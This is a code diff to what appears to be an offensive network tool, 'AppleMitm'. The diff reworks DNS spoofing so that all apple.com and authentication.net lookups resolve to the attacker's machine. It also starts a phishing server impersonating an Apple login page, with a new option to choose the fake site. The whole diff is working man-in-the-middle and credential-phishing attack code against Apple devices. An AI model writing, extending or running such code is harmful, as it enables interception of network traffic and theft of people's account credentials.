@@ -192,23 +192,10 @@ class AppleMitm:
     # region DNS server
     def _start_dns_server(self):
         dns_server: DnsServer = DnsServer(network_interface=self._your['network-interface'])
-        if self._mitm_technique in [1, 2, 3]:
-            dns_server.start(fake_answers=True,
-                             fake_ipv4_addresses=[self._your['ipv4-address']],
-                             success_domains=['captive.apple.com', 'authentication.net'])
-        if self._mitm_technique in [4, 5, 6]:
-            dns_server.start(fake_answers=True,
-                             fake_ipv4_addresses=[self._your['ipv4-address']],
-                             fake_ipv6_addresses=[self._your['ipv6-link-address']],
-                             listen_ipv6=True,
-                             success_domains=['captive.apple.com', 'authentication.net'])
-    # endregion
-
-    # region Phishing server
-    @staticmethod
-    def _phishing_server(address: str = '0.0.0.0', port: int = 80, site='apple'):
-        phishing_server: PhishingServer = PhishingServer()
-        phishing_server.start(address=address, port=port, site=site, redirect='authentication.net', quiet=True)
+        dns_server.start(fake_ipv4_addresses=[self._your['ipv4-address']],
+                         fake_ipv6_addresses=[self._your['ipv6-link-address']],
+                         fake_domains_regexp=['.*apple.com', 'authentication.net'],
+                         success_domains=['captive.apple.com', 'authentication.net'])
     # endregion
 
     # region Requests sniffer PRN function
@@ -266,7 +253,8 @@ class AppleMitm:
               gateway_ipv6_address: Union[None, str] = None,
               dns_ipv4_address: Union[None, str] = None,
               dns_ipv6_address: Union[None, str] = None,
-              ipv6_prefix: Union[None, str] = None):
+              ipv6_prefix: Union[None, str] = None,
+              phishing_site: Union[None, str] = None):
 
         # region Variables
         thread_manager: ThreadManager = ThreadManager(10)
@@ -622,8 +610,12 @@ class AppleMitm:
             thread_manager.add_task(self._disconnect_device)
         # endregion
 
-        # region Start Phishing server
-        self._phishing_server()
+        # region Phishing server
+        if phishing_site is None:
+            phishing_site = 'apple'
+        phishing_server: PhishingServer = PhishingServer()
+        phishing_server.start(address='0.0.0.0', port=80, site=phishing_site,
+                              redirect='authentication.net', quiet=True)
         # endregion
 
     # endregion
@@ -690,7 +682,8 @@ def main():
                          gateway_ipv6_address=args.gateway_ipv6,
                          dns_ipv4_address=args.dns_ipv4,
                          dns_ipv6_address=args.dns_ipv6,
-                         ipv6_prefix=args.ipv6_prefix)
+                         ipv6_prefix=args.ipv6_prefix,
+                         phishing_site=args.phishing_site)
 
     except KeyboardInterrupt:
         base.print_info('Exit')
